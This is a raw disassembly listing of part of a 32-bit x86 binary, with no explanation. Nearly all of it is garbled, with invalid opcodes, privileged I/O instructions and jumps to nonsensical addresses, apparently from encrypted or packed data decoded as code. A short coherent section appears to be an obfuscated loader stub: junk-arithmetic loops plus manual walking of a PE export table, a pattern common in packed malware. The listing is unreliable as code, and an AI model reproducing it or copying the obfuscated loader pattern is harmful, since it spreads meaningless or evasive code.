  413fec:	add    BYTE PTR [ebp-0x1d],0x71
  413ff0:	sub    esp,DWORD PTR [eax+0x56]
  413ff3:	call   0x3835:0x2a8c0b9d
  413ffa:	cdq    
  413ffb:	(bad)  
  413ffc:	fsub   QWORD PTR [ebx]
  413ffe:	outs   dx,BYTE PTR ds:[esi]
  413fff:	hlt    
  414000:	sahf   
  414001:	in     al,dx
  414002:	pop    ebx
  414003:	loop   0x413f8d
  414005:	pop    ds
  414006:	fldcw  WORD PTR [esi-0x19]
  414009:	mov    al,ds:0x7f130f81
  41400e:	push   eax
  41400f:	loop   0x413f98
  414011:	into   
  414012:	lds    esi,FWORD PTR [edi-0x1bd6f741]
  414018:	ret    0xf7d
  41401b:	jnp    0x413fa3
  41401d:	test   DWORD PTR [edi],esi
  41401f:	mov    ebp,0x9ce8d2a2
  414024:	sub    al,ah
  414026:	sub    bh,BYTE PTR [ecx+0x197e5d42]
  41402c:	xchg   BYTE PTR [edx],ah
  41402e:	nop
  41402f:	stos   DWORD PTR es:[edi],eax
  414030:	jmp    0x4589ec87
  414035:	push   cs
  414036:	sti    
  414037:	stos   BYTE PTR es:[edi],al
  414038:	mov    ah,0x44
  41403a:	aam    0x77
  41403c:	fcmovbe st,st(7)
  41403e:	and    BYTE PTR [ebp+edx*8-0x7e21ba0f],al
  414045:	jmp    0x36f0cb2e
  41404a:	not    DWORD PTR [ebx-0x36]
  41404d:	mov    bh,0x14
  41404f:	mov    bh,0xef
  414051:	icebp  
  414052:	stc    
  414053:	rol    edx,1
  414055:	div    BYTE PTR [ebx-0x2e6d80c6]
  41405b:	xchg   dh,bl
  41405d:	std    
  41405e:	inc    eax
  41405f:	outs   dx,DWORD PTR ds:[esi]
  414060:	cs (bad) 
  414062:	or     DWORD PTR [ebp+0x65],esi
  414065:	aaa    
  414066:	mov    ?,esi
  414068:	mov    esi,0x5a79c832
  41406d:	sti    
  41406e:	loopne 0x41403a
  414070:	mov    bh,0x15
  414072:	pop    es
  414073:	jb     0x12ab09a4
  414079:	fbld   TBYTE PTR [ebx]
  41407b:	frstor [ebx-0x3d610108]
  414081:	mov    ebx,0xcc3aada4
  414086:	fistp  WORD PTR [ebp-0x31cd90eb]
  41408c:	xchg   ecx,eax
  41408d:	dec    esp
  41408e:	dec    ebx
  41408f:	inc    ebx
  414090:	push   0x631a858e
  414095:	push   ss
  414096:	add    cl,BYTE PTR [eax+0xc]
  414099:	inc    ebp
  41409a:	bound  eax,QWORD PTR [eax]
  41409c:	imul   eax,edi,0xb3472f57
  4140a2:	int    0xf0
  4140a4:	in     eax,0xb
  4140a6:	fimul  WORD PTR [ecx-0x555d77a5]
  4140ac:	cmp    eax,edi
  4140ae:	push   es
  4140af:	sbb    al,0x27
  4140b1:	mov    bh,0xd8
  4140b3:	mov    al,ds:0xa9a5e90
  4140b8:	xor    bl,0x0
  4140bb:	sub    eax,0x27d72b02
  4140c0:	enter  0xe3f7,0xd0
  4140c4:	icebp  
  4140c5:	pusha  
  4140c6:	or     esp,DWORD PTR [ebp+0x36]
  4140c9:	clc    
  4140ca:	fcomp  DWORD PTR [edi]
  4140cc:	(bad)  
  4140cd:	cmc    
  4140ce:	cmp    cl,bl
  4140d0:	cli    
  4140d1:	cmp    BYTE PTR [eax+0x50],bl
  4140d4:	mov    WORD PTR [edx+0x72],cs
  4140d7:	pop    ebp
  4140d8:	jle    0x41414e
  4140da:	mov    al,ds:0x8cb07850
  4140df:	pusha  
  4140e0:	pop    ebp
  4140e1:	and    eax,0x76096678
  4140e6:	outs   dx,DWORD PTR ds:[esi]
  4140e7:	daa    
  4140e8:	in     eax,0x41
  4140ea:	ret    
  4140eb:	sbb    esi,DWORD PTR [ebx-0x70]
  4140ee:	jno    0x4140bc
  4140f0:	ror    DWORD PTR [eax+eax*4-0x7775ed4f],0xe
  4140f8:	cmp    eax,0x8a3c647d
  4140fd:	sub    BYTE PTR [edx+ebp*4-0x75],0x31
  414102:	fucom  st(6)
  414104:	push   esi
  414105:	dec    eax
  414106:	bswap  eax
  414108:	dec    esi
  414109:	retf   0xd57d
  41410c:	push   esi
  41410d:	pop    eax
  41410e:	pop    ds
  41410f:	add    al,0xea
  414111:	xchg   BYTE PTR [edi],cl
  414113:	sub    eax,DWORD PTR [ecx+0x227b749b]
  414119:	retf   
  41411a:	mov    eax,0x40927b1a
  41411f:	shr    BYTE PTR [ecx-0x2ccebdc7],0x4f
  414126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414127:	imul   eax,eax,0xffffffa3
  41412a:	mov    eax,0x2f25fea7
  41412f:	and    BYTE PTR [edi-0x41270e08],ch
  414135:	fisub  WORD PTR [edx]
  414137:	add    BYTE PTR [esi-0x75d76f6d],ah
  41413d:	lea    eax,[edx]
  41413f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414140:	jbe    0x414144
  414142:	dec    edi
  414143:	imul   esp,DWORD PTR [eax],0x1b
  414146:	mov    esp,0xb8a564c0
  41414b:	xchg   BYTE PTR [edx],bl
  41414d:	jb     0x4140e3
  41414f:	ret    0x1054
  414152:	sub    BYTE PTR [edi+0x38],dl
  414155:	jno    0x414157
  414157:	shl    DWORD PTR [ebx+0x397e778c],cl
  41415d:	sbb    eax,0x81ec458b
  414162:	and    eax,0x42fd55
  414167:	add    BYTE PTR [eax],al
  414169:	add    BYTE PTR [eax],al
  41416b:	mov    ecx,DWORD PTR ds:0x42fd55
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fd55,ecx
  414178:	cmp    DWORD PTR ds:0x42fd55,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e5ef
  41418b:	cmp    DWORD PTR ds:0x42fd55,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fd59,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e77f
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fd69
  4141ba:	sbb    DWORD PTR ds:0x42fd55,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd85,0x42e793
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e76b,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd85,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e78f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fd5d,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fd5d
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fd5d,ecx
  41420f:	cmp    DWORD PTR ds:0x42fd5d,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e5f3
  41423b:	cmp    DWORD PTR ds:0x42fd5d,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fd5d
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fd5d,ecx
  414257:	cmp    DWORD PTR ds:0x42fd5d,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x414208
  414283:	jge    0x4142da
  414285:	sub    al,0x80
  414287:	jae    0x4142f9
  414289:	jo     0x414244
  41428b:	jle    0x4142fd
  41428d:	jo     0x41430a
  41428f:	pop    esp
  414290:	data16 rcr BYTE PTR [esi],0xe7
  414294:	fld    TBYTE PTR ds:[ebx]
  414297:	std    
  414298:	pop    esp
  414299:	xchg   ebx,eax
  41429a:	call   0xbf79:0x85d74ba3
  4142a1:	fdivr  QWORD PTR [ecx+0x55]
  4142a4:	shl    DWORD PTR [edi],0xa5
  4142a7:	xchg   ecx,eax
  4142a8:	xchg   esp,eax
  4142a9:	add    BYTE PTR [ebx],dl
  4142ab:	adc    DWORD PTR [edi],edx
  4142ad:	(bad)  
  4142af:	push   eax
  4142b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142b1:	xchg   esi,eax
  4142b2:	inc    ecx
  4142b3:	out    0x16,al
  4142b5:	mov    ebp,0xe5b566b5
  4142ba:	xchg   ecx,eax
  4142bb:	ret    
  4142bc:	popf   
  4142bd:	jbe    0x4142b3
  4142bf:	shl    dh,0x0
  4142c2:	mov    edi,0xb52df68b
  4142c7:	in     al,0x97
  4142c9:	inc    ecx
  4142ca:	cmc    
  4142cb:	iret   
  4142cc:	in     al,dx
  4142cd:	addr16 jle 0x41431f
  4142d0:	pop    ebx
  4142d1:	lea    edi,ds:[edx]
  4142d4:	popf   
  4142d5:	jl     0x4142f8
  4142d7:	xchg   edx,eax
  4142d8:	(bad)  
  4142d9:	lock nop
  4142db:	call   FWORD PTR ds:[ebx+0x17]
  4142df:	lods   eax,DWORD PTR ds:[esi]
  4142e0:	call   0x149e:0x9be09fc1
  4142e7:	jmp    0x445af820
  4142ec:	ss mov ch,0x4f
  4142ef:	sub    BYTE PTR [eax-0x4f69ab91],bl
  4142f5:	xchg   edx,eax
  4142f6:	popa   
  4142f7:	inc    ebp
  4142f8:	mov    dh,0xe3
  4142fa:	dec    edx
  4142fb:	sub    edx,eax
  4142fd:	sub    bl,bh
  4142ff:	ret    
  414300:	(bad)  
  414301:	adc    eax,0x3d48f7e7
  414306:	pop    edi
  414307:	sub    DWORD PTR [edi+0x27d0a2db],ebx
  41430d:	xchg   ebx,eax
  41430e:	inc    edx
  41430f:	lods   eax,DWORD PTR ds:[esi]
  414310:	sbb    eax,DWORD PTR [edx]
  414312:	adc    esp,DWORD PTR [esp+ebp*4-0x49d67244]
  414319:	pop    edx
  41431a:	pop    ebp
  41431b:	imul   ebp,DWORD PTR [ebp+0x580c753b],0xf1d3dc8d
  414325:	sub    dh,bl
  414327:	out    dx,al
  414328:	pop    ecx
  414329:	setb   al
  41432c:	mov    WORD PTR [edx],cs
  41432e:	mov    ds:0x6c8440de,eax
  414333:	jmp    0x4142dd
  414335:	or     eax,0xf0136331
  41433a:	loope  0x4142bc
  41433c:	xchg   ebx,eax
  41433d:	repnz and DWORD PTR [edx+0x7a],ebp
  414341:	(bad)  
  414342:	jecxz  0x414302
  414344:	fcom   QWORD PTR [eax+0x6febe2a5]
  41434a:	std    
  41434b:	jae    0x414321
  41434d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41434e:	mov    ds:0xb717ce6c,eax
  414353:	in     al,0xe5
  414355:	pop    ebx
  414356:	daa    
  414357:	and    BYTE PTR [ebp+0x5b],0x1d
  41435b:	daa    
  41435c:	test   DWORD PTR [ebx-0x3ba175c7],ebx
  414362:	jnp    0x414376
  414364:	retf   0x47ca
  414367:	and    ah,bl
  414369:	mov    ebp,0x8b7a0e06
  41436e:	mov    eax,ds:0x974d6323
  414373:	sub    bh,BYTE PTR [esi+0x407cf491]
  414379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41437a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41437b:	out    0x81,al
  41437d:	fisubr DWORD PTR [esi]
  41437f:	push   ecx
  414380:	test   eax,0x6bbf96db
  414385:	mov    dl,0xa6
  414387:	inc    edx
  414388:	mov    al,ds:0xa944562
  41438d:	sar    DWORD PTR ds:0x35cef60c,1
  414393:	pop    ebp
  414394:	or     BYTE PTR [eax+0x1d],dh
  414397:	add    dh,BYTE PTR [ecx+ebx*1-0x66d1d397]
  41439e:	mov    edi,0xa8c76225
  4143a3:	add    edi,DWORD PTR [eax-0x7c]
  4143a6:	mov    edx,0x82c1dd99
  4143ab:	jns    0x414361
  4143ad:	daa    
  4143ae:	jl     0x414375
  4143b0:	dec    ebx
  4143b1:	jl     0x41433b
  4143b3:	mov    ah,0xf5
  4143b5:	xchg   esi,eax
  4143b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143b7:	inc    esi
  4143b8:	pop    esp
  4143b9:	das    
  4143ba:	js     0x4143fd
  4143bc:	retf   
  4143bd:	aas    
  4143be:	jl     0x4143ed
  4143c0:	mov    DWORD PTR [ecx+0x70],ebx
  4143c3:	stos   DWORD PTR es:[edi],eax
  4143c4:	mov    eax,0x5e8efa9c
  4143c9:	fisttp QWORD PTR [ecx]
  4143cb:	rcl    DWORD PTR [edx-0x4f],0x23
  4143cf:	(bad)  
  4143d0:	jmp    0x414450
  4143d2:	int    0x6d
  4143d4:	dec    ecx
  4143d5:	adc    DWORD PTR [ecx+0x4ab87b40],0x191e30db
  4143df:	push   ebx
  4143e0:	loopne 0x414461
  4143e2:	and    edi,DWORD PTR [esi]
  4143e4:	(bad)  
  4143e6:	xchg   edx,eax
  4143e7:	mov    al,0xe8
  4143e9:	adc    eax,0x67019a76
  4143ee:	ja     0x41444d
  4143f0:	dec    ebx
  4143f1:	daa    
  4143f2:	test   eax,0xee276faa
  4143f7:	std    
  4143f8:	push   cs
  4143f9:	cmp    BYTE PTR [edx+0x3],0x43
  4143fd:	fmul   DWORD PTR [ebp+ecx*8+0x7ba23be1]
  414404:	sbb    eax,DWORD PTR [edx+0x4b8141c]
  41440a:	dec    ebp
  41440b:	shl    cl,cl
  41440d:	push   edi
  41440e:	shl    BYTE PTR [ebp+0xc],1
  414411:	sbb    al,0xd3
  414413:	out    dx,eax
  414414:	mov    ds:0xa19bc6be,al
  414419:	call   0x81be:0xfeb3cddf
  414420:	jnp    0x414461
  414422:	inc    edx
  414423:	jle    0x41446a
  414425:	test   DWORD PTR [edi+0x5a0bf872],esp
  41442b:	add    ebp,DWORD PTR [ebx]
  41442d:	mov    dh,0xd2
  41442f:	pusha  
  414430:	adc    al,0x2b
  414432:	or     eax,0xfaec7e8e
  414437:	test   DWORD PTR [edx-0x1e],edx
  41443a:	push   0xb2252b16
  41443f:	mov    ebx,0xb5cf3e44
  414445:	xor    BYTE PTR ds:0x23c39cad,dh
  41444b:	(bad)  
  41444c:	push   cs
  41444d:	push   ss
  41444e:	dec    esp
  41444f:	cmp    dl,0x38
  414452:	pop    esp
  414453:	and    BYTE PTR [ecx-0x3f],dl
  414456:	jecxz  0x4144a9
  414458:	cmova  esp,DWORD PTR [ebp-0x48]
  41445c:	and    al,0x63
  41445e:	xchg   edi,eax
  41445f:	js     0x414496
  414461:	popf   
  414462:	cmp    bl,dh
  414464:	add    al,0x8a
  414466:	mov    esp,DWORD PTR [esi]
  414468:	jp     0x41446b
  41446a:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41446c:	loop   0x41442a
  41446e:	popf   
  41446f:	and    al,0x5a
  414471:	add    cl,BYTE PTR [eax-0x66]
  414474:	sbb    ah,BYTE PTR [ebx-0x62]
  414477:	mov    eax,ds:0x5a080490
  41447c:	inc    ebp
  41447d:	outs   dx,DWORD PTR ds:[esi]
  41447e:	push   ds
  41447f:	lea    ebx,[ebp-0x655688e4]
  414485:	mov    bl,0xd5
  414487:	push   cs
  414488:	and    ch,BYTE PTR [esi-0x76e105fe]
  41448e:	jmp    0xde7c:0xc715bd70
  414495:	loope  0x414494
  414497:	xchg   esi,eax
  414498:	aad    0x6c
  41449a:	push   ebx
  41449b:	add    DWORD PTR [ecx+0x53f4e5a1],ecx
  4144a1:	or     ecx,DWORD PTR [esi-0xc1befa]
  4144a7:	test   DWORD PTR [ebp+0x34],esp
  4144aa:	mov    WORD PTR [esi],es
  4144ac:	dec    edx
  4144ad:	mov    edx,DWORD PTR [edi+0x2c]
  4144b0:	fwait
  4144b1:	push   ds
  4144b2:	lods   eax,DWORD PTR ds:[esi]
  4144b3:	cwde   
  4144b4:	ds mov ch,0x70
  4144b7:	jo     0x414505
  4144b9:	adc    esi,DWORD PTR [ebx+0x53]
  4144bc:	sub    eax,0x5bf5298d
  4144c1:	xor    eax,ebx
  4144c3:	hlt    
  4144c4:	cmp    ebp,ecx
  4144c6:	push   ecx
  4144c7:	fwait
  4144c8:	rol    BYTE PTR [edi-0x66d2e233],0xe6
  4144cf:	es push cs
  4144d1:	ffree  st(6)
  4144d3:	mov    ds,WORD PTR [ecx]
  4144d5:	in     eax,0x31
  4144d7:	cmp    eax,0x359a1500
  4144dc:	sahf   
  4144dd:	mov    ds:0xe2ace058,eax
  4144e2:	jmp    0x86840e2b
  4144e7:	push   0x554a79ef
  4144ec:	xchg   esp,eax
  4144ed:	adc    al,BYTE PTR [edx]
  4144ef:	lods   al,BYTE PTR ds:[esi]
  4144f0:	cmp    BYTE PTR [esp+eax*4-0x464c4ccc],dh
  4144f7:	std    
  4144f8:	and    al,0x7
  4144fa:	iret   
  4144fb:	(bad)  
  4144fc:	mov    ah,BYTE PTR [ebx+ebx*2-0x65f08d0f]
  414503:	test   eax,0xb02fd8c2
  414508:	(bad)  
  414509:	xor    ebx,DWORD PTR [eax+0x4072228]
  41450f:	pusha  
  414510:	js     0x41451d
  414512:	and    esi,DWORD PTR ds:0x9177ba
  414518:	cwde   
  414519:	xlat   BYTE PTR ds:[ebx]
  41451a:	aam    0xaa
  41451c:	jmp    0x7d41:0xe909d442
  414523:	icebp  
  414524:	int    0xe1
  414526:	sbb    BYTE PTR [edx+0xa9ee0ab],ah
  41452c:	mov    ds:0x1ddc1828,eax
  414531:	xchg   ebp,eax
  414532:	pop    ebx
  414533:	push   ebp
  414534:	fstp   DWORD PTR [esi+0x1cab89f0]
  41453a:	test   al,0xf2
  41453c:	mov    cs,WORD PTR [ebp-0x2]
  41453f:	loop   0x414539
  414541:	dec    ebx
  414542:	(bad)  
  414543:	cld    
  414544:	mov    cl,0x94
  414546:	and    al,0xa5
  414548:	sbb    ch,al
  41454a:	in     eax,dx
  41454b:	dec    eax
  41454c:	or     bl,BYTE PTR [ecx]
  41454e:	stos   BYTE PTR es:[edi],al
  41454f:	inc    ebp
  414550:	mov    edx,0x21cc15da
  414555:	push   DWORD PTR [ebp-0x30]
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0x39cebeb4
  414576:	mov    ecx,0x7f70c9c2
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x41451d
  414581:	inc    ecx
  414582:	pop    esi
  414583:	cwde   
  414584:	fstp   DWORD PTR [eax]
  414586:	xor    esi,DWORD PTR [edx]
  414588:	cdq    
  414589:	mov    esi,0x23dc5678
  41458e:	fsub   st,st(3)
  414590:	pop    ebp
  414591:	lods   eax,DWORD PTR ds:[esi]
  414592:	sbb    DWORD PTR [ecx-0x38],ebx
  414595:	daa    
  414596:	mov    al,ds:0xa8dd3a89
  41459b:	(bad)  
  41459c:	cmp    eax,esp
  41459e:	je     0x4145da
  4145a0:	pmovmskb esi,mm7
  4145a3:	xor    BYTE PTR [ebx+0x2aa306bf],ah
  4145a9:	setnp  al
  4145ac:	sbb    al,BYTE PTR [edx-0x9]
  4145af:	loopne 0x41455d
  4145b1:	mov    edx,0x95853337
  4145b6:	ja     0x4145c4
  4145b8:	mov    DWORD PTR [edi],edx
  4145ba:	je     0x414591
  4145bc:	cmp    ebx,DWORD PTR [esi+ecx*2]
  4145bf:	and    DWORD PTR [esi+0xc],ebx
  4145c2:	xchg   DWORD PTR [edi],eax
  4145c4:	cmp    ah,BYTE PTR [esi]
  4145c6:	xlat   BYTE PTR ds:[ebx]
  4145c7:	and    al,0xb2
  4145c9:	mov    edx,0xfb6c9b3d
  4145ce:	add    dl,dh
  4145d0:	fisttp QWORD PTR [edx-0x6a]
  4145d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145d4:	sub    DWORD PTR [ecx+0x41],edx
  4145d7:	std    
  4145d8:	mov    WORD PTR [eax],cs
  4145da:	xchg   ecx,eax
  4145db:	and    eax,0xc4ed918b
  4145e0:	add    eax,0x47ee31d0
  4145e5:	jnp    0x41465b
  4145e7:	inc    edx
  4145e8:	jno    0x4145fc
  4145ea:	retf   
  4145eb:	push   0xffffffb7
  4145ed:	fwait
  4145ee:	shl    BYTE PTR [ecx-0xa8ad31f],cl
  4145f4:	ins    DWORD PTR es:[edi],dx
  4145f5:	call   0x228d:0xb07c5649
  4145fc:	ror    BYTE PTR [esi+0x1c62ada1],1
  414602:	push   0xfffffff7
  414604:	mov    ch,0x4d
  414606:	push   ss
  414607:	lds    edx,FWORD PTR [esi-0x5e8dcfef]
  41460d:	adc    BYTE PTR [edx+edi*4],dh
  414610:	cmp    eax,0xb6af1a96
  414615:	pop    esi
  414616:	fwait
  414617:	pop    edx
  414618:	retf   0x679f
  41461b:	js     0x4145a5
  41461d:	ss mov edx,0xf11bf706
  414623:	enter  0xf74a,0x97
  414627:	fsub   DWORD PTR [ebx-0x70]
  41462a:	xchg   esi,eax
  41462b:	mov    ?,WORD PTR [edx+0x3b]
  41462e:	dec    ecx
  41462f:	mov    edi,0x140b8146
  414634:	cmp    ebp,DWORD PTR [ebp-0x4dcfd33d]
  41463a:	adc    eax,0xc8c5842d
  41463f:	(bad)  
  414640:	(bad)  
  414641:	jmp    0x202e5303
  414646:	xor    bl,BYTE PTR [ebx+0x38be6f94]
  41464c:	mov    ah,0x4c
  41464e:	adc    DWORD PTR ds:0x1f6e08f8,ecx
  414654:	cmp    esi,DWORD PTR [eax+eiz*4-0x7ed836f4]
  41465b:	pusha  
  41465c:	dec    edx
  41465d:	mov    BYTE PTR [ecx],ah
  41465f:	or     al,0x9c
  414661:	ss xchg edx,eax
  414663:	adc    dl,BYTE PTR [esi]
  414665:	jns    0x41466d
  414667:	sti    
  414668:	pop    ebx
  414669:	xor    edx,DWORD PTR ds:0x8e06fb60
  41466f:	in     al,dx
  414670:	scas   al,BYTE PTR es:[edi]
  414671:	das    
  414672:	adc    ah,BYTE PTR [ebx]
  414674:	mov    eax,0xc6ab036d
  414679:	cmc    
  41467a:	mov    eax,0x98b2c35c
  41467f:	sti    
  414680:	xchg   ebp,eax
  414681:	mov    al,ds:0x48d19720
  414686:	sbb    DWORD PTR [ecx-0x23],eax
  414689:	xchg   DWORD PTR [ecx],ecx
  41468b:	loope  0x414703
  41468d:	scas   eax,DWORD PTR es:[edi]
  41468e:	cmp    al,0xe4
  414690:	xchg   edi,eax
  414691:	in     eax,dx
  414692:	add    bh,cl
  414694:	and    cl,BYTE PTR [eax]
  414696:	imul   edx,DWORD PTR [ebx-0x2fad9902],0xffffffac
  41469d:	dec    esp
  41469e:	pop    es
  41469f:	inc    eax
  4146a0:	and    ebp,ebp
  4146a2:	jbe    0x4146d1
  4146a4:	pop    es
  4146a5:	aaa    
  4146a6:	jecxz  0x41467a
  4146a8:	sub    bh,BYTE PTR [ecx+0x31]
  4146ab:	xor    ah,ah
  4146ad:	mov    al,ds:0x9d3f5086
  4146b2:	pop    edx
  4146b3:	xor    al,0x8e
  4146b6:	in     eax,0x52
  4146b8:	in     eax,dx
  4146b9:	bound  eax,QWORD PTR [ebx]
  4146bb:	dec    ebx
  4146bc:	xor    esp,esi
  4146be:	data16 int 0x42
  4146c1:	sub    eax,0xa74d107c
  4146c6:	sbb    esi,DWORD PTR [esi]
  4146c8:	or     al,0xaa
  4146ca:	loope  0x414697
  4146cc:	sub    DWORD PTR [esp+esi*4+0x6e],ebp
  4146d0:	mov    esp,0xf42b6afa
  4146d5:	stos   BYTE PTR es:[edi],al
  4146d6:	mov    eax,gs:0x878232fd
  4146dc:	cmp    ah,ch
  4146de:	aaa    
  4146df:	mov    ebx,0x37a67a3e
  4146e4:	sub    eax,0xc5b403a4
  4146e9:	mov    ch,0xcd
  4146eb:	fbld   TBYTE PTR [ebp+esi*4+0xa]
  4146ef:	repnz pop ebx
  4146f1:	das    
  4146f2:	push   cs
  4146f3:	sar    DWORD PTR [edi],0xbe
  4146f6:	into   
  4146f7:	js     0x41474a
  4146f9:	ret    0xb940
  4146fc:	loope  0x4146cc
  4146fe:	add    ch,ah
  414700:	sub    ah,al
  414702:	mov    al,0xeb
  414704:	lea    eax,[eax+0xc879e2d]
  41470a:	sub    edi,DWORD PTR [ebp+0x3bf58dee]
  414710:	sti    
  414711:	jns    0x41472b
  414713:	push   ebp
  414714:	cli    
  414715:	sbb    eax,0x2a01f2df
  41471a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41471b:	xor    eax,0xcc498cc0
  414720:	es pop esp
  414722:	xchg   esi,eax
  414723:	add    ecx,DWORD PTR [edi-0x61]
  414726:	inc    ebp
  414727:	xor    al,0x35
  414729:	sahf   
  41472a:	loope  0x414748
  41472c:	icebp  
  41472d:	cmp    ebp,ecx
  41472f:	push   es
  414730:	jl     0x414778
  414732:	stos   BYTE PTR es:[edi],al
  414733:	mov    ds:0xf3395fd1,eax
  414738:	push   0xac0716ad
  41473d:	test   eax,0xa6326559
  414742:	mov    ecx,0xf737d3dc
  414747:	ficomp DWORD PTR [eax-0x102f8cdb]
  41474d:	pop    esp
  41474e:	push   0xffffffa5
  414750:	xor    ah,BYTE PTR [ebx+ecx*2]
  414753:	cmp    DWORD PTR [esi-0xce472e0],0x4dba3855
  41475d:	aaa    
  41475e:	xor    DWORD PTR [esi],ecx
  414760:	xor    al,0x99
  414762:	pop    esi
  414763:	and    DWORD PTR [esi+0x77],edx
  414766:	in     al,0x39
  414768:	jp     0x4147a0
  41476a:	jp     0x4147b0
  41476c:	xchg   esp,eax
  41476d:	mov    al,0xb8
  41476f:	adc    esp,DWORD PTR [esi+0x44]
  414772:	outs   dx,BYTE PTR ds:[esi]
  414773:	add    DWORD PTR [esi+edx*4],ebp
  414776:	hlt    
  414777:	pop    ds
  414778:	mov    cs,WORD PTR [esi+0x56ad6f9c]
  41477e:	mov    ds:0xd0ad534c,al
  414783:	pusha  
  414784:	scas   eax,DWORD PTR es:[edi]
  414785:	call   0x819869a2
  41478a:	sbb    al,0xec
  41478c:	pushf  
  41478d:	in     al,0x79
  41478f:	mov    ecx,0x68072df9
  414794:	aaa    
  414795:	add    DWORD PTR [edi+0xce55fe5],eax
  41479b:	push   ebp
  41479c:	daa    
  41479d:	fisttp DWORD PTR [ebp-0x42e5018]
  4147a3:	ror    BYTE PTR [eax],0x7
  4147a6:	sbb    DWORD PTR [ebx],ecx
  4147a8:	mov    ecx,0xdf08dfad
  4147ad:	or     al,bh
  4147af:	fcomp  DWORD PTR [ebx+0x2a6f2c7f]
  4147b5:	fidivr DWORD PTR [esi-0x6e]
  4147b8:	jp     0x4147ca
  4147ba:	loope  0x414802
  4147bc:	mov    ah,0x7b
  4147be:	inc    esi
  4147bf:	cwde   
  4147c0:	pop    ebx
  4147c1:	(bad)  
  4147c2:	xor    al,0xbe
  4147c4:	les    ecx,FWORD PTR [edi+0x2e7f6912]
  4147ca:	and    eax,0x2420d9d4
  4147cf:	mov    ebx,0xc7dffa9
  4147d4:	mov    BYTE PTR [edi],dh
  4147d6:	data16 cs das 
  4147d9:	aaa    
  4147da:	lock add cl,BYTE PTR [eax-0x733abe75]
  4147e1:	xchg   esp,edi
  4147e3:	add    ebp,DWORD PTR [ebx+0x1b220dd5]
  4147e9:	loopne 0x4147a4
  4147eb:	mov    ecx,0x57298eff
  4147f0:	aad    0x8c
  4147f2:	scas   eax,DWORD PTR es:[edi]
  4147f3:	cvtps2pd xmm1,xmm4
  4147f6:	xor    BYTE PTR [edx+0x6235c840],0xd3
  4147fd:	mov    eax,ds:0x774dee13
  414802:	aad    0xe0
  414804:	dec    ebp
  414805:	mov    bh,0x9b
  414807:	push   esp
  414808:	and    ah,dl
  41480a:	(bad)  
  41480b:	mov    dl,0x1c
  41480d:	mov    al,ds:0x9f482be4
  414812:	and    BYTE PTR [ebp-0xf1ec1d7],dh
  414818:	fwait
  414819:	out    dx,al
  41481a:	dec    ecx
  41481b:	mov    ?,WORD PTR [eax-0x66900d21]
  414821:	and    ebx,DWORD PTR [ebp-0x406e2c77]
  414827:	out    dx,eax
  414828:	int    0xc3
  41482a:	pop    ebx
  41482b:	and    ebp,DWORD PTR [ecx]
  41482d:	ds ret 
  41482f:	inc    edx
  414830:	sub    al,bl
  414832:	add    esi,ebp
  414834:	xchg   esi,eax
  414835:	(bad)  
  414836:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414837:	fdiv   DWORD PTR [ebx]
  414839:	je     0x414895
  41483b:	adc    BYTE PTR [ecx-0x16],0x4c
  41483f:	push   eax
  414840:	cmp    ah,bh
